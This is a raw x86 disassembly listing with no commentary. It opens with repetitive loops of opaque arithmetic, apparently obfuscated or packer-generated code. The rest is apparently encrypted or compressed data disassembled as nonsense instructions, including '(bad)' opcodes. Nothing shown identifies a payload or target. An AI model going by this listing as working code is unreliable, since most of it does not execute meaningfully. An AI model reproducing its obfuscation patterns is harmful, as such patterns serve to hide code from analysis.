  412502:	mov    ebx,DWORD PTR [ebp-0x8]
  412505:	xor    edx,eax
  412507:	xor    ebx,eax
  412509:	sub    edx,ebx
  41250b:	sub    edx,esi
  41250d:	xor    edx,eax
  41250f:	mov    DWORD PTR [ebp+0x8],edx
  412512:	mov    edx,DWORD PTR [ebp+0x8]
  412515:	mov    ebx,DWORD PTR [ebp-0x58]
  412518:	lea    edx,[ebx+edx*1+0x5708f8]
  41251f:	mov    DWORD PTR [ebp-0x58],edx
  412522:	mov    edx,DWORD PTR [ebp+0x8]
  412525:	mov    ebx,DWORD PTR [ebp-0x54]
  412528:	add    edx,0x64f89a
  41252e:	imul   edx,ebx
  412531:	mov    DWORD PTR [ebp-0x54],edx
  412534:	mov    edx,DWORD PTR [ebp+0x8]
  412537:	mov    ebx,DWORD PTR [ebp-0x50]
  41253a:	add    edx,0x242ebed
  412540:	and    edx,ebx
  412542:	mov    DWORD PTR [ebp-0x50],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,DWORD PTR [ebp-0x4c]
  41254b:	add    edx,ecx
  41254d:	or     edx,ebx
  41254f:	mov    DWORD PTR [ebp-0x4c],edx
  412552:	mov    edx,DWORD PTR [ebp+0x8]
  412555:	mov    ebx,0xfdbe0321
  41255a:	sub    ebx,edx
  41255c:	add    ebx,DWORD PTR [ebp-0x48]
  41255f:	mov    DWORD PTR [ebp-0x48],ebx
  412562:	mov    edx,DWORD PTR [ebp+0x8]
  412565:	mov    ebx,DWORD PTR [ebp-0x44]
  412568:	add    edx,edi
  41256a:	xor    edx,ebx
  41256c:	mov    DWORD PTR [ebp-0x44],edx
  41256f:	mov    edx,DWORD PTR [ebp+0x8]
  412572:	xor    edx,eax
  412574:	add    edx,esi
  412576:	jne    0x4124ff
  41257c:	mov    edx,DWORD PTR [ebp-0x14]
  41257f:	mov    DWORD PTR [ebp+0x8],edx
  412582:	jmp    0x4125f7
  412587:	mov    edx,DWORD PTR [ebp+0x8]
  41258a:	mov    ebx,DWORD PTR [ebp-0x8]
  41258d:	xor    edx,eax
  41258f:	xor    ebx,eax
  412591:	sub    edx,ebx
  412593:	sub    edx,esi
  412595:	xor    edx,eax
  412597:	mov    DWORD PTR [ebp+0x8],edx
  41259a:	mov    edx,DWORD PTR [ebp+0x8]
  41259d:	mov    ebx,DWORD PTR [ebp-0x58]
  4125a0:	lea    edx,[ebx+edx*1+0x5708f8]
  4125a7:	mov    DWORD PTR [ebp-0x58],edx
  4125aa:	mov    edx,DWORD PTR [ebp+0x8]
  4125ad:	mov    ebx,DWORD PTR [ebp-0x54]
  4125b0:	add    edx,0x64f89a
  4125b6:	imul   edx,ebx
  4125b9:	mov    DWORD PTR [ebp-0x54],edx
  4125bc:	mov    edx,DWORD PTR [ebp+0x8]
  4125bf:	mov    ebx,DWORD PTR [ebp-0x50]
  4125c2:	add    edx,0x242ebed
  4125c8:	and    edx,ebx
  4125ca:	mov    DWORD PTR [ebp-0x50],edx
  4125cd:	mov    edx,DWORD PTR [ebp+0x8]
  4125d0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4125d3:	add    edx,ecx
  4125d5:	or     edx,ebx
  4125d7:	mov    DWORD PTR [ebp-0x4c],edx
  4125da:	mov    edx,DWORD PTR [ebp+0x8]
  4125dd:	mov    ebx,0xfdbe0321
  4125e2:	sub    ebx,edx
  4125e4:	add    ebx,DWORD PTR [ebp-0x48]
  4125e7:	mov    DWORD PTR [ebp-0x48],ebx
  4125ea:	mov    edx,DWORD PTR [ebp+0x8]
  4125ed:	mov    ebx,DWORD PTR [ebp-0x44]
  4125f0:	add    edx,edi
  4125f2:	xor    edx,ebx
  4125f4:	mov    DWORD PTR [ebp-0x44],edx
  4125f7:	mov    edx,DWORD PTR [ebp+0x8]
  4125fa:	xor    edx,eax
  4125fc:	add    edx,esi
  4125fe:	jne    0x412587
  412604:	mov    edx,DWORD PTR [ebp-0x8]
  412607:	mov    ebx,DWORD PTR [ebp-0xc]
  41260a:	xor    edx,eax
  41260c:	lea    edx,[edx+ebx*1+0x3272f8]
  412613:	mov    DWORD PTR [ebp-0xc],edx
  412616:	mov    edx,DWORD PTR [ebp-0x10]
  412619:	xor    edx,eax
  41261b:	add    edx,esi
  41261d:	jne    0x4122e0
  412623:	jmp    0x414ab3
  412628:	mov    ecx,DWORD PTR [ebp-0x14]
  41262b:	mov    DWORD PTR [ebp+0x8],ecx
  41262e:	jmp    0x4126a7
  412633:	mov    ecx,DWORD PTR [ebp+0x8]
  412636:	mov    edx,DWORD PTR [ebp-0x8]
  412639:	xor    ecx,eax
  41263b:	xor    edx,eax
  41263d:	sub    ecx,edx
  41263f:	sub    ecx,esi
  412641:	xor    ecx,eax
  412643:	mov    DWORD PTR [ebp+0x8],ecx
  412646:	mov    ecx,DWORD PTR [ebp+0x8]
  412649:	mov    edx,DWORD PTR [ebp-0x58]
  41264c:	lea    ecx,[edx+ecx*1+0x5708f8]
  412653:	mov    DWORD PTR [ebp-0x58],ecx
  412656:	mov    ecx,DWORD PTR [ebp+0x8]
  412659:	mov    edx,DWORD PTR [ebp-0x54]
  41265c:	add    ecx,0x64f89a
  412662:	imul   ecx,edx
  412665:	mov    DWORD PTR [ebp-0x54],ecx
  412668:	mov    ecx,DWORD PTR [ebp+0x8]
  41266b:	mov    edx,DWORD PTR [ebp-0x50]
  41266e:	add    ecx,0x242ebed
  412674:	and    ecx,edx
  412676:	mov    DWORD PTR [ebp-0x50],ecx
  412679:	mov    ecx,DWORD PTR [ebp+0x8]
  41267c:	mov    edx,DWORD PTR [ebp-0x4c]
  41267f:	add    ecx,0xf641bea
  412685:	or     ecx,edx
  412687:	mov    DWORD PTR [ebp-0x4c],ecx
  41268a:	mov    ecx,DWORD PTR [ebp+0x8]
  41268d:	mov    edx,0xfdbe0321
  412692:	sub    edx,ecx
  412694:	add    edx,DWORD PTR [ebp-0x48]
  412697:	mov    DWORD PTR [ebp-0x48],edx
  41269a:	mov    ecx,DWORD PTR [ebp+0x8]
  41269d:	mov    edx,DWORD PTR [ebp-0x44]
  4126a0:	add    ecx,edi
  4126a2:	xor    ecx,edx
  4126a4:	mov    DWORD PTR [ebp-0x44],ecx
  4126a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4126aa:	xor    ecx,eax
  4126ac:	add    ecx,esi
  4126ae:	jne    0x412633
  4126b4:	jmp    0x414abf
  4126b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4126bc:	mov    edx,DWORD PTR [ebp-0x8]
  4126bf:	xor    ecx,eax
  4126c1:	xor    edx,eax
  4126c3:	sub    ecx,edx
  4126c5:	sub    ecx,esi
  4126c7:	xor    ecx,eax
  4126c9:	mov    DWORD PTR [ebp+0x8],ecx
  4126cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126cf:	mov    edx,DWORD PTR [ebp-0x58]
  4126d2:	lea    ecx,[edx+ecx*1+0x5708f8]
  4126d9:	mov    DWORD PTR [ebp-0x58],ecx
  4126dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126df:	mov    edx,DWORD PTR [ebp-0x54]
  4126e2:	add    ecx,0x64f89a
  4126e8:	imul   ecx,edx
  4126eb:	mov    DWORD PTR [ebp-0x54],ecx
  4126ee:	mov    ecx,DWORD PTR [ebp+0x8]
  4126f1:	mov    edx,DWORD PTR [ebp-0x50]
  4126f4:	add    ecx,0x242ebed
  4126fa:	and    ecx,edx
  4126fc:	mov    DWORD PTR [ebp-0x50],ecx
  4126ff:	mov    ecx,DWORD PTR [ebp+0x8]
  412702:	mov    edx,DWORD PTR [ebp-0x4c]
  412705:	add    ecx,0xf641bea
  41270b:	or     ecx,edx
  41270d:	jmp    0x414a86
  412712:	enter  0xa3a8,0x29
  412716:	jecxz  0x412742
  412718:	dec    edx
  412719:	push   0xffffff84
  41271b:	add    al,0xed
  41271d:	xlat   BYTE PTR ds:[ebx]
  41271e:	jg     0x41270c
  412720:	xchg   edi,eax
  412721:	repz push cs
  412723:	jb     0x4127a0
  412725:	jnp    0x4126fe
  412727:	sahf   
  412728:	jnp    0x4127a5
  41272a:	cwde   
  41272b:	nop
  41272c:	std    
  41272d:	shl    BYTE PTR [ebx+esi*1+0x0],1
  412731:	fadd   DWORD PTR [ebx]
  412733:	and    edx,0x3abe757e
  412739:	into   
  41273a:	mov    esi,0x3905d971
  41273f:	add    DWORD PTR [eax],ebp
  412741:	gs dec edi
  412743:	lods   al,BYTE PTR ds:[esi]
  412744:	cld    
  412745:	mov    dh,bl
  412747:	cwde   
  412748:	daa    
  412749:	je     0x4126dc
  41274b:	mov    ds:0x7a4e0df2,eax
  412750:	add    esi,DWORD PTR [edx+0x2a]
  412753:	push   cs
  412754:	popf   
  412755:	inc    eax
  412756:	lahf   
  412757:	xchg   ecx,eax
  412758:	rcr    BYTE PTR [ecx],cl
  41275a:	lock bound esi,QWORD PTR [ebx-0x5726777c]
  412761:	inc    esp
  412762:	test   al,0xd1
  412764:	and    dh,al
  412766:	sbb    al,0x99
  412768:	xchg   esp,ecx
  41276a:	jno    0x41279e
  41276c:	push   esp
  41276d:	mov    ss,WORD PTR [eax-0xf]
  412770:	jmp    0x412777
  412772:	(bad)  
  412773:	push   0xe6e40dad
  412778:	aam    0xff
  41277a:	into   
  41277b:	xchg   edi,eax
  41277c:	push   es
  41277d:	int3   
  41277e:	sbb    ebx,DWORD PTR [ecx+0x55]
  412781:	mov    ebp,0x10c2fd3c
  412786:	xor    eax,0xec04235b
  41278b:	fld    DWORD PTR [ebp-0x30dffd83]
  412791:	pop    esi
  412792:	rcr    cl,cl
  412794:	mov    edi,0xb8f93853
  412799:	xchg   esi,eax
  41279a:	lods   al,BYTE PTR ds:[esi]
  41279b:	mov    ch,0x17
  41279d:	adc    DWORD PTR [ebp+0x72],eax
  4127a0:	adc    al,0xe4
  4127a2:	xor    DWORD PTR [edx+0x7f49d5db],esi
  4127a8:	xchg   ebp,eax
  4127a9:	or     dh,bl
  4127ab:	push   ds
  4127ac:	add    eax,0xb7f0a066
  4127b1:	scas   al,BYTE PTR es:[edi]
  4127b2:	push   ecx
  4127b3:	lods   eax,DWORD PTR ds:[esi]
  4127b4:	push   di
  4127b6:	mov    cl,0xe0
  4127b9:	dec    edi
  4127ba:	mov    cl,0xea
  4127bc:	mov    eax,ds:0x12a2c578
  4127c1:	leave  
  4127c2:	jo     0x4127ef
  4127c4:	or     eax,0x531604f9
  4127c9:	and    cl,bl
  4127cb:	hlt    
  4127cc:	sub    eax,0xc9c398f6
  4127d1:	inc    edx
  4127d2:	div    BYTE PTR [edx+0x4]
  4127d5:	stc    
  4127d6:	sub    ebp,ebx
  4127d8:	mov    BYTE PTR [ecx+eax*2-0x6156507d],bh
  4127df:	sub    DWORD PTR [ecx-0x1],edx
  4127e2:	jmp    0xc0a494ca
  4127e7:	and    dl,BYTE PTR [edx+eax*2+0x41]
  4127eb:	pop    ecx
  4127ec:	(bad)  
  4127ed:	xchg   edi,eax
  4127ee:	out    0xd7,eax
  4127f0:	cmp    DWORD PTR ds:0xcca3e437,edi
  4127f6:	or     al,0xe3
  4127f8:	cmp    ebp,esp
  4127fa:	mov    ch,0xed
  4127fc:	cmp    al,BYTE PTR [edx+edx*2]
  4127ff:	push   ss
  412800:	dec    edx
  412801:	out    dx,al
  412802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412803:	mov    esp,esi
  412805:	imul   edi,edi,0x5
  412808:	nop
  412809:	inc    ecx
  41280a:	sbb    ah,BYTE PTR [esi+esi*2+0x1323a6]
  412811:	jne    0x412857
  412813:	fwait
  412814:	mov    al,0x42
  412816:	sbb    edi,ecx
  412818:	aad    0xc3
  41281a:	arpl   WORD PTR [edi+0x5fc8f349],di
  412820:	jle    0x41283f
  412822:	sub    eax,0x14ce8308
  412827:	jl     0x412846
  412829:	cli    
  41282a:	jo     0x4127c7
  41282c:	add    al,0x1e
  41282e:	sti    
  41282f:	mov    al,0x7a
  412831:	add    BYTE PTR ds:0x7a854d71,dh
  412837:	xor    edx,DWORD PTR [ecx+0x74]
  41283a:	std    
  41283b:	ins    DWORD PTR es:[edi],dx
  41283c:	jns    0x41289a
  41283e:	stc    
  41283f:	sar    BYTE PTR [edx+0x4b98d44f],0x68
  412846:	sub    dl,BYTE PTR [esi-0x47e41f0f]
  41284c:	rol    BYTE PTR [esi+ecx*1-0x5],1
  412850:	jle    0x41287a
  412852:	mov    WORD PTR [edi+0x79],fs
  412855:	sahf   
  412856:	or     DWORD PTR ds:0xbfeaa424,0xffffff8a
  41285d:	ins    DWORD PTR es:[edi],dx
  41285e:	jge    0x41287d
  412860:	retf   0x1d6b
  412863:	iret   
  412864:	mov    bh,ch
  412866:	dec    edx
  412867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412868:	je     0x41280c
  41286a:	mov    bl,0xb2
  41286c:	dec    eax
  41286d:	outs   dx,BYTE PTR ds:[esi]
  41286e:	scas   al,BYTE PTR es:[edi]
  41286f:	mov    ecx,0xaf52d941
  412874:	xchg   ebx,eax
  412875:	push   0xffffffec
  412877:	aam    0xd8
  412879:	adc    al,cl
  41287b:	jno    0x4128f2
  41287d:	adc    al,dh
  41287f:	icebp  
  412880:	push   ebp
  412881:	mov    ah,0x7b
  412883:	add    eax,0xdc47af23
  412888:	and    DWORD PTR [ebp-0x3d],esp
  41288b:	rcl    DWORD PTR [eax+0x4a],0xf7
  41288f:	mov    esi,0x6282b812
  412894:	daa    
  412895:	popa   
  412896:	in     al,dx
  412897:	add    BYTE PTR [edi-0x22071b2b],0x4f
  41289e:	mov    al,ds:0xc0a9ceb9
  4128a3:	dec    edx
  4128a4:	mov    ds:0xc823797f,al
  4128a9:	push   esi
  4128aa:	test   DWORD PTR [ebp+0x5c793c97],ebx
  4128b0:	jmp    0x88ef:0x78f77e7b
  4128b7:	call   0xd9b3:0x4add001e
  4128be:	das    
  4128bf:	imul   edx,DWORD PTR [eax],0xffffff9c
  4128c2:	pop    ebp
  4128c3:	in     eax,dx
  4128c4:	or     ah,cl
  4128c6:	mov    dh,0x2
  4128c8:	pop    esi
  4128c9:	xor    eax,0xfdc87e04
  4128ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128cf:	scas   al,BYTE PTR es:[edi]
  4128d0:	leave  
  4128d1:	adc    DWORD PTR [ecx+ebx*1-0xc],edi
  4128d5:	std    
  4128d6:	ins    BYTE PTR es:[edi],dx
  4128d7:	pushf  
  4128d8:	out    dx,eax
  4128d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128da:	pop    ebp
  4128db:	(bad)  
  4128dd:	out    dx,al
  4128de:	cmp    al,0x7d
  4128e0:	dec    esi
  4128e1:	das    
  4128e2:	jmp    0xbd87:0xd4d71f35
  4128e9:	dec    edx
  4128ea:	stos   DWORD PTR es:[edi],eax
  4128eb:	cmp    DWORD PTR gs:[edx+0x3dd2da4a],ebx
  4128f2:	sbb    bl,BYTE PTR [ebx-0x50767a2a]
  4128f8:	mov    ds:0xcbbdb731,al
  4128fd:	and    dl,BYTE PTR [esi-0x60efad38]
  412903:	fcom   QWORD PTR [edx]
  412905:	xor    BYTE PTR ds:0x4bcd780f,bl
  41290b:	pop    edi
  41290c:	arpl   WORD PTR [eax+esi*2],cx
  41290f:	outs   dx,DWORD PTR ds:[esi]
  412910:	neg    DWORD PTR [eax+ecx*1-0x2709c0b8]
  412917:	cmc    
  412918:	imul   ebx,DWORD PTR [ecx+esi*8],0xeea66f0
  41291f:	std    
  412920:	pop    ds
  412921:	jb     0x412943
  412923:	lea    eax,[ecx]
  412925:	push   ecx
  412926:	hlt    
  412927:	in     eax,0xbf
  412929:	ins    DWORD PTR es:[edi],dx
  41292a:	sbb    al,0xb6
  41292c:	mov    esi,0x14c8811d
  412931:	repnz add ecx,eax
  412934:	idiv   cl
  412936:	int    0xa8
  412938:	(bad)
  41293b:	(bad)
  41293e:	fdiv   QWORD PTR [ebx+0x3e3504ba]
  412944:	jne    0x4128dc
  412946:	cmc    
  412947:	or     DWORD PTR [edx],esi
  412949:	aad    0x7c
  41294b:	mov    es,WORD PTR [ebp+0x33]
  41294e:	ja     0x412971
  412950:	push   0x6f
  412952:	pop    edi
  412953:	daa    
  412954:	ficom  WORD PTR [ebx+0x7d]
  412957:	ins    BYTE PTR es:[edi],dx
  412958:	pop    ecx
  412959:	fst    QWORD PTR [eax]
  41295b:	jb     0x412947
  41295d:	pop    esi
  41295e:	sbb    BYTE PTR [eax-0x3442886d],bh
  412964:	shl    BYTE PTR [eax],0x20
  412967:	icebp  
  412968:	bnd ret 0x66da
  41296c:	retf   0x9a53
  41296f:	clc    
  412970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412971:	out    0xc5,al
  412973:	inc    eax
  412974:	and    eax,0x2337a91
  412979:	pop    eax
  41297a:	adc    eax,eax
  41297c:	shl    ecx,cl
  41297e:	scas   al,BYTE PTR es:[edi]
  41297f:	sbb    edx,DWORD PTR es:[esp+eax*4-0x77]
  412984:	jecxz  0x4129ba
  412986:	pop    edx
  412987:	gs push esi
  412989:	cmp    ch,BYTE PTR [eax+0x2f7d96c9]
  41298f:	jo     0x4129fc
  412991:	test   BYTE PTR [eax+ecx*8+0x30cab820],cl
  412998:	(bad)
  41299b:	test   al,0x7d
  41299d:	cmp    eax,0xd17597d4
  4129a2:	mov    dh,0x65
  4129a4:	xchg   ebp,eax
  4129a5:	outs   dx,BYTE PTR ds:[esi]
  4129a6:	ror    dl,0x9
  4129a9:	mov    esp,0x2fc15086
  4129ae:	lods   al,BYTE PTR ds:[esi]
  4129af:	popa   
  4129b0:	sbb    bl,BYTE PTR [eax+0x3a]
  4129b3:	dec    edx
  4129b4:	and    bh,BYTE PTR [ecx]
  4129b6:	mov    al,0x8b
  4129b8:	sbb    al,0x9
  4129ba:	and    DWORD PTR [ebx],0x958fa7ce
  4129c0:	test   cl,bl
  4129c2:	xor    ecx,eax
  4129c4:	data16 sar BYTE PTR [esi],1
  4129c7:	int3   
  4129c8:	mov    dh,0xe0
  4129ca:	jae    0x412a00
  4129cc:	sbb    esp,edi
  4129ce:	(bad)  [esi+0x3e7cdbd3]
  4129d4:	mov    dh,dh
  4129d6:	dec    eax
  4129d7:	xlat   BYTE PTR ds:[ebx]
  4129d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129d9:	ficomp DWORD PTR [ebx+ecx*4-0x52]
  4129dd:	mov    WORD PTR [esi],ds
  4129df:	imul   esp,DWORD PTR [ecx+0x9],0xa947e6c5
  4129e6:	imul   esp,DWORD PTR [ebx-0x53],0xd94c6c93
  4129ed:	int3   
  4129ee:	es jo  0x412a5c
  4129f1:	mov    ebp,0xcdaf1081
  4129f6:	mov    bh,0xad
  4129f8:	ins    BYTE PTR es:[edi],dx
  4129f9:	inc    ebx
  4129fa:	or     eax,0xf5b566b6
  4129ff:	push   ds
  412a00:	stos   BYTE PTR es:[edi],al
  412a01:	or     ah,BYTE PTR [edx-0x69]
  412a04:	xor    DWORD PTR [edx+esi*2],eax
  412a07:	psubb  mm4,QWORD PTR [edx]
  412a0a:	les    esp,FWORD PTR [ebx+0x3d71ef5f]
  412a10:	adc    BYTE PTR [esi+0x26],bl
  412a13:	mov    al,0xd8
  412a15:	sbb    eax,0xcb34457a
  412a1a:	sub    ebx,edi
  412a1c:	out    dx,eax
  412a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a1e:	scas   eax,DWORD PTR es:[edi]
  412a1f:	jle    0x412a8f
  412a21:	ins    BYTE PTR es:[edi],dx
  412a22:	stos   DWORD PTR es:[edi],eax
  412a23:	fs in  al,dx
  412a25:	outs   dx,DWORD PTR ds:[esi]
  412a26:	sub    ch,cl
  412a28:	xlat   BYTE PTR ds:[bx]
  412a2a:	push   0xffffff92
  412a2c:	adc    al,0xbd
  412a2e:	popa   
  412a2f:	fdecstp 
  412a31:	mov    ah,0xd5
  412a33:	and    dl,al
  412a35:	adc    al,0xaf
  412a37:	pop    ecx
  412a38:	fstp   DWORD PTR gs:[ebx]
  412a3b:	sub    al,0x6f
  412a3d:	jns    0x412a2b
  412a3f:	(bad)  
  412a40:	adc    DWORD PTR [edx+0x66],esp
  412a43:	lock pop es
  412a45:	xlat   BYTE PTR ds:[ebx]
  412a46:	cdq    
  412a47:	test   bh,cl
  412a49:	jmp    0x42ba:0xf7c3f69e
  412a50:	xchg   ebp,eax
  412a51:	xchg   ebp,eax
  412a52:	aam    0x96
  412a54:	sahf   
  412a55:	mov    eax,0x8f276e2
  412a5a:	popf   
  412a5b:	in     eax,0xa
  412a5d:	ret    
  412a5e:	jnp    0x4129f3
  412a60:	call   0xf1f4c468
  412a65:	or     DWORD PTR [ecx-0x4ee8004b],esp
  412a6b:	fidiv  WORD PTR [ecx-0x34]
  412a6e:	push   esp
  412a6f:	mov    al,ds:0xf053af7c
  412a74:	stos   DWORD PTR es:[edi],eax
  412a75:	or     dh,BYTE PTR [ecx+eax*1]
  412a78:	mov    ds:0x8c1e41c5,eax
  412a7d:	sub    ecx,DWORD PTR [ebp-0x39]
  412a80:	xor    eax,0x5b8624b3
  412a85:	ss cmc 
  412a87:	adc    eax,0xf2f986cd
  412a8c:	out    0x23,eax
  412a8e:	push   es
  412a8f:	mov    ecx,0xefb5110f
  412a94:	lock lock mov ch,0x92
  412a98:	pop    ecx
  412a99:	sbb    DWORD PTR [ecx-0x51],edx
  412a9c:	mov    gs,ecx
  412a9e:	inc    eax
  412a9f:	leave  
  412aa0:	lea    ebx,[ecx]
  412aa2:	mov    ebx,0x26c2615a
  412aa7:	gs mov dl,0xe1
  412aaa:	lock xchg DWORD PTR [ecx+0x1a],ebx
  412aae:	sahf   
  412aaf:	stc    
  412ab0:	je     0x412b0e
  412ab2:	ror    DWORD PTR [edx+edx*1+0x20dfdf11],cl
  412ab9:	mov    al,0xaa
  412abb:	pop    ebp
  412abc:	outs   dx,BYTE PTR ds:[esi]
  412abd:	aam    0xbc
  412abf:	mov    ebx,0x2330127e
  412ac4:	imul   ebx,DWORD PTR [ecx+0x2aa9bc0a],0xffffffbd
  412acb:	dec    esi
  412acc:	ret    0x8f29
  412acf:	nop
  412ad0:	in     al,0x46
  412ad2:	xor    cl,bh
  412ad4:	push   edi
  412ad5:	popa   
  412ad6:	fdivr  st(7),st
  412ad8:	(bad)  
  412ad9:	repnz aas 
  412adb:	ds xchg esi,eax
  412add:	pop    edx
  412ade:	int3   
  412adf:	retf   
  412ae0:	or     DWORD PTR [ebx+0x14183c71],ebx
  412ae6:	fadd   DWORD PTR [esi+ebp*4-0x1724fb6]
  412aed:	mov    esi,0x6450eed4
  412af2:	or     DWORD PTR [esi+0x19f25d9c],ebp
  412af8:	adc    edi,edx
  412afa:	bound  ecx,QWORD PTR [ecx-0x2d8eca5b]
  412b00:	inc    edi
  412b01:	xor    bh,BYTE PTR [ebx-0x2]
  412b04:	add    eax,0x9f8f3f04
  412b09:	add    DWORD PTR [edi-0x7b3c2c57],esp
  412b0f:	sbb    ch,ch
  412b11:	dec    esi
  412b12:	or     DWORD PTR [eax+0x79],ebx
  412b15:	shl    DWORD PTR [eax+eax*8-0x200122ea],0xfb
  412b1d:	lea    eax,[edi+eiz*4-0x4943e1b4]
  412b24:	repz das 
  412b26:	pop    eax
  412b27:	push   ebx
  412b28:	or     eax,0xc97f289f
  412b2d:	jl     0x412add
  412b2f:	mov    ebx,0x814c04ab
  412b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b35:	mov    bl,0x71
  412b37:	inc    ebx
  412b38:	or     ch,BYTE PTR [edx]
  412b3a:	and    al,0x3e
  412b3c:	dec    ecx
  412b3d:	call   0xc57faa61
  412b42:	or     eax,DWORD PTR [ebp+0x20]
  412b45:	dec    ebx
  412b46:	idiv   DWORD PTR [eax+eiz*4-0x485a3cda]
  412b4d:	test   BYTE PTR [ecx+0x568c7356],bh
  412b53:	dec    ebp
  412b54:	pushf  
  412b55:	mov    DWORD PTR [esi-0x5c],ebp
  412b58:	lods   al,BYTE PTR ds:[esi]
  412b59:	fidiv  DWORD PTR [ebx+0x7a]
  412b5c:	mov    esi,0xd5d5724c
  412b61:	and    al,0x6e
  412b63:	ins    BYTE PTR es:[edi],dx
  412b64:	data16 test BYTE PTR [edi-0x75],0xcb
  412b69:	cmp    dl,bl
  412b6b:	pop    esp
  412b6c:	inc    ebx
  412b6d:	dec    esp
  412b6e:	xor    eax,0x9ef24946
  412b73:	jmp    0x412b45
  412b75:	mov    al,ds:0xc8226222
  412b7a:	cmp    eax,DWORD PTR [ebx+ecx*1]
  412b7d:	mov    ecx,0x39b6448a
  412b82:	or     al,0x7f
  412b84:	jle    0x412bf8
  412b86:	test   eax,0xb3e1fcdb
  412b8b:	cli    
  412b8c:	xchg   ebx,eax
  412b8d:	xchg   edi,eax
  412b8e:	retf   
  412b8f:	das    
  412b90:	into   
  412b91:	call   DWORD PTR [ebp+0x413da77f]
  412b97:	add    eax,0xe4c01704
  412b9c:	test   DWORD PTR ds:0x5ae69590,0x47ac633b
  412ba6:	add    dl,cl
  412ba8:	fist   DWORD PTR [edi+0xc]
  412bab:	mov    ebx,0x58c98200
  412bb0:	ins    BYTE PTR es:[edi],dx
  412bb1:	inc    ecx
  412bb2:	adc    al,0x65
  412bb4:	mov    ah,0x94
  412bb6:	clc    
  412bb7:	adc    eax,0x14977e
  412bbc:	sub    eax,0x21fc71c8
  412bc1:	jbe    0x412b6d
  412bc3:	sub    al,0x97
  412bc5:	xchg   DWORD PTR [esi+ebp*1+0x2c9f7f53],ebx
  412bcc:	sub    BYTE PTR [esi+edi*1+0x2dd8df16],al
  412bd3:	in     eax,0xb5
  412bd5:	in     al,0xf9
  412bd7:	scas   al,BYTE PTR es:[edi]
  412bd8:	sti    
  412bd9:	pop    esp
  412bda:	fst    DWORD PTR [edx+esi*1]
  412bdd:	inc    ebp
  412bde:	nop
  412bdf:	call   0x1a43:0xe06e079f
  412be6:	adc    BYTE PTR [ecx+0x67],bl
  412be9:	sub    edi,DWORD PTR [ebp+0x63]
  412bec:	cmp    al,0x88
  412bee:	xor    eax,0x4dd842a3
  412bf3:	nop
  412bf4:	outs   dx,DWORD PTR ds:[esi]
  412bf5:	rcr    DWORD PTR [ecx-0x63f96ae0],0x63
  412bfc:	imul   eax,DWORD PTR [eax+edx*1],0xffffffa4
  412c00:	add    esi,DWORD PTR [ebx+0x16]
  412c03:	punpckhbw mm2,QWORD PTR [edx]
  412c06:	mov    ecx,0x8d01ea0
  412c0b:	test   ah,bl
  412c0d:	jecxz  0x412bc7
  412c0f:	adc    esp,edi
  412c11:	dec    ecx
  412c12:	xor    esp,ebp
  412c14:	dec    esp
  412c15:	scas   al,BYTE PTR es:[edi]
  412c16:	sbb    eax,0xa52bb225
  412c1b:	icebp  
  412c1c:	inc    ecx
  412c1d:	xchg   ecx,eax
  412c1e:	xor    al,0xb2
  412c20:	std    
  412c21:	mov    edx,0x942c3d63
  412c26:	mov    dl,0x6c
  412c28:	sub    eax,0xb656e90d
  412c2d:	scas   al,BYTE PTR es:[edi]
  412c2e:	jb     0x412c95
  412c30:	cmp    ah,cl
  412c32:	sbb    BYTE PTR [esi],bh
  412c34:	or     BYTE PTR [edi+0x4f],dh
  412c37:	xchg   ebx,eax
  412c38:	mov    edi,0x823abcb3
  412c3d:	xchg   ebp,eax
  412c3e:	(bad)  
  412c3f:	jb     0x412ca3
  412c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c42:	cmc    
  412c43:	neg    BYTE PTR [ebx+eax*4+0x3f]
  412c47:	ss aas 
  412c49:	add    al,0xf4
  412c4b:	idiv   BYTE PTR [ecx]
  412c4d:	push   ebx
  412c4e:	out    dx,al
  412c4f:	dec    esi
  412c50:	cli    
  412c51:	in     al,dx
  412c52:	outs   dx,DWORD PTR ds:[esi]
  412c53:	imul   ebx,DWORD PTR [esi],0xffffff84
  412c56:	dec    eax
  412c57:	mov    ds:0x57f89387,eax
  412c5c:	jns    0x412cb9
  412c5e:	mov    WORD PTR [ebx],es
  412c60:	mov    DWORD PTR [esi],ebx
  412c62:	mov    edx,0xc16ca807
  412c67:	je     0x412c62
  412c69:	aaa    
  412c6a:	sub    esp,edi
  412c6c:	out    0x74,al
  412c6e:	xlat   BYTE PTR ds:[ebx]
  412c6f:	mov    bl,0xa2
  412c71:	fiadd  DWORD PTR [edx]
  412c73:	push   cs
  412c74:	in     al,dx
  412c75:	pop    esi
  412c76:	add    BYTE PTR [edi+0x14],ch
  412c79:	mov    eax,ds:0xcd784c70
  412c7e:	aad    0x46
  412c80:	dec    edx
  412c81:	pop    esp
  412c82:	and    eax,0xc601c12f
  412c87:	jmp    0x412ccc
  412c89:	adc    DWORD PTR [ebx],ebx
  412c8b:	dec    edx
  412c8c:	pop    esi
  412c8d:	xchg   ebp,eax
  412c8e:	and    eax,0xcdb023a9
  412c93:	sbb    cl,BYTE PTR [ebp+0x2624a036]
  412c99:	push   ecx
  412c9a:	push   edx
  412c9b:	pop    edi
  412c9c:	mov    ds:0x5c31389d,eax
  412ca1:	pushf  
  412ca2:	sub    BYTE PTR [edx-0x28201042],0x7b
  412ca9:	cmc    
  412caa:	and    al,0xdc
  412cac:	popf   
  412cad:	jae    0x412c8d
  412caf:	in     al,dx
  412cb0:	xchg   esi,eax
  412cb1:	fldenv [ebx-0x25]
  412cb4:	add    cl,ah
  412cb6:	jne    0x412c68
  412cb8:	mov    ah,BYTE PTR [ecx-0x5e]
  412cbb:	sbb    eax,0x3ebe98e3
  412cc0:	or     eax,0xdc40e0bc
  412cc5:	mov    al,0xa3
  412cc7:	inc    edi
